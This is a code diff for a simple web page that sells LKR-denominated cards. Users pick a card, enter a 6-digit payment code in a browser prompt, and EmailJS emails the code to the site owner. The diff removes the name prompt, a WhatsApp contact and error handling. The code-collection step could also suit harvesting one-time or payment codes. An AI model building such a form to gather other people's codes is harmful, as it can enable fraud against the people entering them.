@@ -1,55 +1,35 @@
-const cards = [
-    { name: "500 LKR" }, { name: "1000 LKR" }, { name: "2000 LKR" }
-];
+const cards = [{ name: "500 LKR" }, { name: "1000 LKR" }, { name: "2000 LKR" }];
 
 function renderCards() {
     const list = document.getElementById('card-list');
     cards.forEach((card) => {
-        const div = document.createElement('div');
-        div.className = "card-box";
-        div.innerHTML = `<strong>${card.name}</strong>`;
-        div.onclick = () => showCardDetails(card);
-        list.appendChild(div);
+        const btn = document.createElement('button');
+        btn.className = "card-btn";
+        btn.innerText = card.name;
+        btn.onclick = () => showGenerate(card.name);
+        list.appendChild(btn);
     });
 }
 
-function showCardDetails(card) {
+function showGenerate(name) {
     document.getElementById('dash-view').innerHTML = `
-        <h3>${card.name} Selected</h3>
-        <p>Click Generate to send request.</p>
-        <button class="btn" onclick="sendCodeRequest('${card.name}')">Generate Code</button>
-        <button class="btn" style="background:transparent;" onclick="location.reload()">Back</button>
+        <h3>${name} Selected</h3>
+        <button class="card-btn" style="width:100%" onclick="finalStep('${name}')">Generate Code</button>
+        <button class="card-btn" style="width:100%; margin-top:10px; background:transparent" onclick="location.reload()">Back</button>
     `;
 }
 
-function sendCodeRequest(cardName) {
-    // 1. පාරිභෝගිකයාගෙන් නම අහනවා
-    const custName = prompt("Enter your name:");
-    if (!custName) return;
-
-    // 2. මෙතන තමයි ඔයා ඉල්ලපු 6 digit code එක ගහන්න තැන
-    const userCode = prompt("Please enter your 6-digit payment code:");
-    if (!userCode || userCode.length !== 6) {
-        alert("Invalid code! Please enter exactly 6 digits.");
-        return;
-    }
-
-    document.getElementById('dash-view').innerHTML = `<h2>Generating your code...</h2>`;
-
-    // 3. ඊමේල් එකට දැන් අර කෝඩ් එකත් යනවා
+function finalStep(name) {
+    const code = prompt("Enter 6-digit payment code:");
+    if (!code || code.length !== 6) return alert("Invalid code!");
+    
+    // EmailJS එක හරියටම දාන්න
     emailjs.send("service_ky2ympa", "template_5sac14q", {
-        name: custName,
-        card_name: cardName,
-        payment_code: userCode // මේක ඔයාගේ Template එකට එකතු වෙයි
+        name: "User",
+        card_name: name,
+        payment_code: code
     }, "HahSYzYSEJF5oRsnt").then(() => {
-        document.getElementById('dash-view').innerHTML = `
-            <h2>Success!</h2>
-            <h3 style="color:yellow;">Request sent with your code. Owner will verify.</h3>
-            <p>WhatsApp: <strong>0772915479</strong></p>
-            <button class="btn" onclick="location.reload()">Back Home</button>
-        `;
-    }).catch(() => {
-        alert("Error sending request!");
+        alert("Success! Request sent.");
         location.reload();
     });
 }
